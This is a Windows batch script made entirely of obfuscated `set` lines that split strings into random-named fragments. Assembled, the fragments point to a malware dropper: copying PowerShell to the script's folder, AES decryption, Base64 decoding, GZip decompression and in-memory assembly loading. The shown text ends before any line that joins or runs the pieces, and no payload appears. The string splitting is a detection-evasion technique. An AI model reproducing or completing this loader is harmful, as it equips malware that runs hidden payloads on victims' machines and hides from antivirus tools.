@echo off
set "duZvpoKstB=\W"
set "FYEbSiArlc=he"
set "rSPpWhCLYl=Po"
set "gyAvxufbjo=Wi"
set "vaBOrASdgm=\v"
set "OgzUgfqztA=1."
set "ZtyxRgyVYp=:\"
set "YazftIMpIj=s\"
set "tGFiIeNjte=po"
set "gnKfEhAYsb= C"
set "DgfdMwWyuA=py"
set "HbOWOFLfhg= /"
set "RGpCYKdlJq=y "
set "kfYuxDJlNW=in"
set "sdasHisaZg=we"
set "WIFVzuyYzz=xe"
set "MRupcGhfDy=rs"
set "dXxBDQDUsH=do"
set "MyPDqcliQh=em"
set "sAMCjsytnc=ws"
set "DoaTejIHmG=ow"
set "KQaLiKtvle=rS"
set "cLnkPaPOFR=nd"
set "epYKFkhhEv=he"
set "qJphMSxHrn=st"
set "zUUtsClpfc=.e"
set "byOdYofnIQ=Sy"
set "nAgvPeAXVP=32"
set "oSVgmdqNQc=ll"
set "nAUkYdmsVd=co"
set "rgfohWOBPb=ll"
set "vokYLgXySz=we"
set "ZPTwkSVUzf=0\"
set "QNpjMsVwil= %~dp0"
set "ATNXIAhzHo=cd"
set "flvZJbxYIc= [st"
set "bLIiLhVTsZ=pose"
set "FNXBmyzJbT==');"
set "WWkwkonVxQ= = N"
set "rFiwhqHPJR=-4] "
set "OsVllaSCMm=ff.I"
set "GHsYwfZCOD=.Con"
set "SusMiXhaqL=OcvN"
set "zMCitdyneJ=[-1."
set "ekteaglccN=:('g"
set "gOfeXzfZKH=zHhH"
set "egFqJpkKIu=za.D"
set "CAsFVeZpVE=Kkff"
set "INQiNLmcKG== $Y"
set "tVkkmRjKhF=106u"
set "RhdmagolNH=Xs.T"
set "qEGLBPzplf=Rwza"
set "aYqeoSKcQk= = $"
set "sCKakIIcVW=yste"
set "zTyrtPzmNV=y]::"
set "iGpjjVoYAN=)($O"
set "beabuQRVsx=.Ass"
set "ejCATCWNMg=ach "
set "AHEgRpwqqJ=ress"
set "KPkErfEZbO=ionM"
set "XnfqMjNJDo=.Com"
set "aBQkafFupn=Secu"
set "oTatCNUwpI=6esa"
set "BZeGiCwxYk=ptog"
set "dUnaSXxVxc=1..-"
set "dFoXsvoEME=IKW."
set "nvsGYFiWgO=ode]"
set "VjgTfMKvyD=gMod"
set "TxyfBKZUCt=pose"
set "pYBlFOpXOA=('da"
set "yyWpJTMhNF=bstr"
set "DkgFPlhXjU=$tRw"
set "TMFoGqfTIn=ose("
set "cqWwAeriKX=gnir"
set "BWRmqIlGBO=eam("
set "rtdnAbwzue=YKaq"
set "FjdCqmwxft=se()"
set "tlfyyZcjWP=();$"
set "VWeLtgmJVS=Syst"
set "bCQVLdPxLo=dj0C"
set "yowpONirnL=.Cry"
set "dHKZwhFIHF=-1.."
set "FyNKWsRMhV=tion"
set "jqgNyYijVn=gsYZ"
set "BaMSEGugPP=n ''"
set "HHhdflWWpY=Fina"
set "YqGXbUnkWG=]::("
set "pHYeslJzwG=.IO."
set "FOlGVnSMqm=tem."
set "DvfqmMmJCY=raph"
set "wxfWlHIAVZ=hy.A"
set "hMffUYwThe=m.IO"
set "WFrAqVCUsg=ress"
